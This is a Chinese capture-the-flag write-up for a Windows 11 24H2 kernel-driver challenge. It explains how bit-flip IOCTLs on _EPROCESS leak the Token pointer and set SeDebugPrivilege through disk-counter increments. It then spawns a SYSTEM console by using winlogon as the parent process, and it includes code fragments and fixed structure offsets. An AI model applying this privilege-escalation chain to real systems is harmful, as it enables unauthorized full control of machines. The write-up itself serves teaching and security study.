# Process Flipper

## 题目简述

题目运行于 Windows 11 24H2（build 26100.1150）。选手提交一个静态链接的 EXE，沙箱运行后返回最后一张桌面截图；目标是把权限提升到 `NT AUTHORITY\\SYSTEM`，并在屏幕上显示 `C:\\flag.txt`。

内核驱动创建了 `\\.\\ProcessFlipper` 设备，普通用户可读写。两个 IOCTL 分别把当前进程 `_EPROCESS` 内指定偏移的一位设为 1 或清为 0，允许范围一直延伸到 `0xb80` 字节。虽然接口没有提供任意内核地址，但逐位修改当前 `_EPROCESS` 已足以篡改其中的指针并获得内核读写副作用。

## 解题过程

### 1. 把按位接口组合成 64 位赋值

驱动的核心代码为：

```c
process = (unsigned char *)PsGetCurrentProcess();

// IOCTL_PROCESS_SET
process[input->bitToFlip / 8] |= 1u << (input->bitToFlip % 8);

// IOCTL_PROCESS_CLEAR
process[input->bitToFlip / 8] &= ~(1u << (input->bitToFlip % 8));
```

对目标字段的 64 位逐一调用 SET 或 CLEAR，就能把该字段精确改成任意值：

```cpp
for (int i = 0; i < 64; i++) {
    ULONG bit = fieldOffset * 8 + i;
    DWORD code = (value >> i) & 1
        ? IOCTL_PROCESS_SET
        : IOCTL_PROCESS_CLEAR;
    DeviceIoControl(device, code, &bit, sizeof(bit), nullptr, 0, ...);
}
```

官方利用针对指定系统版本使用两个固定布局偏移：

```cpp
constexpr int DiskCounterOffset = 0x638;
constexpr int TokenOffset       = 0x248;
```

这里选择 `_EPROCESS.DiskCounters` 指针作为中转字段。Windows 在统计进程 I/O 或通过 `NtQuerySystemInformation(SystemProcessInformation)` 枚举进程时，会沿该指针读写 `_PROCESS_DISK_COUNTERS`。因此，控制这个指针就能把内核正常的计数器访问重定向到其他内核对象。

### 2. 借系统进程信息接口泄露 Token

首先只改写 `DiskCounters` 指针的低 12 位，高位仍保留当前 `_EPROCESS` 所在内核页。当前系统中 `_EPROCESS` 在页内的起点为 `0x80`，因此把低位设为：

```cpp
0x080 + TokenOffset - 0x8
```

就会令 `DiskCounters` 指向 `_EPROCESS.Token - 8`。减去 8 是因为 `_PROCESS_DISK_COUNTERS.BytesWritten` 位于结构偏移 `+8`。

随后调用 `NtQuerySystemInformation(SystemProcessInformation)`，在返回数据中找到当前 PID，并取其 `BytesWritten` 字段。该字段此时实际来自 `_EPROCESS.Token`，所以泄露的是 `_EX_FAST_REF` 形式的 Token 指针。屏蔽低四位引用计数即可得到真实地址：

```cpp
token = leakedBytesWritten & ~0xfULL;
```

### 3. 把磁盘计数增量写进 Token 权限位图

本系统的 `_TOKEN.Privileges` 从 Token 偏移 `0x40` 开始，其中依次包含 `Present`、`Enabled` 和 `EnabledByDefault` 三个 64 位位图。`SeDebugPrivilege` 对应第 20 位，即 `1 << 20 = 0x100000`。

先把 `DiskCounters` 指向 `token + 0x40`。由于 `BytesWritten` 是计数器结构的第二个 64 位字段，一次磁盘写入会增加 `token + 0x48` 处的 `Enabled`：

```cpp
patch(device, token + 0x40);
WriteFile(unbufferedFile, buffer, 0x100000, &written, nullptr);
```

文件以 `FILE_FLAG_NO_BUFFERING` 打开，写入大小恰好为 `0x100000`，内核会立即把这个数加到 `BytesWritten`。于是 `Enabled` 中的 `SeDebugPrivilege` 位被置上。

再把指针向前移动 8 字节到 `token + 0x38` 并重复写入，此时 `BytesWritten` 落在 `token + 0x40` 的 `Present` 位图上。两次操作后，当前进程的 Token 同时“拥有”并“启用” `SeDebugPrivilege`。

### 4. 借 winlogon 创建 SYSTEM 子进程

获得调试权限后，枚举进程并以 `PROCESS_ALL_ACCESS` 打开 `winlogon.exe`。把该句柄设置为 `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`，再用 `EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE` 创建命令行进程：

```cpp
UpdateProcThreadAttribute(
    attrs, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
    &winlogonHandle, sizeof(winlogonHandle), nullptr, nullptr
);

CreateProcessW(
    nullptr,
    L"cmd.exe /k type C:\\flag.txt",
    nullptr, nullptr, FALSE,
    EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
    nullptr, L"C:\\", &startupInfo, &processInfo
);
```

指定的父进程是以 SYSTEM 运行的 `winlogon.exe`，新控制台因此获得 SYSTEM 上下文。使用 `/k type C:\\flag.txt` 可让 flag 内容保留在窗口中，等待题目平台截图。官方样例只启动 `cmd.exe`；用于无人值守判题时应补上显示 flag 的命令，不能依赖人工输入。

## 方法总结

本题的驱动原语看似被限制在当前进程对象内部，但 `_EPROCESS` 本身包含大量指向其他内核对象的指针。控制 `DiskCounters` 后，可以把系统原本安全的“读取进程统计”和“累加磁盘写入字节数”分别转化为 Token 地址泄露和固定增量内核写。

完整链条是：逐位覆盖 `_EPROCESS.DiskCounters`，通过 `SystemProcessInformation` 泄露 Token，利用两次 $2^{20}$ 字节的磁盘计数增量设置 `SeDebugPrivilege` 的 `Present` 与 `Enabled` 位，打开 `winlogon.exe`，最后以其为父进程创建 SYSTEM 控制台并显示 flag。固定偏移与页内布局依赖题目指定的 Windows build，换版本必须重新确认 `_EPROCESS` 和 `_TOKEN` 结构。
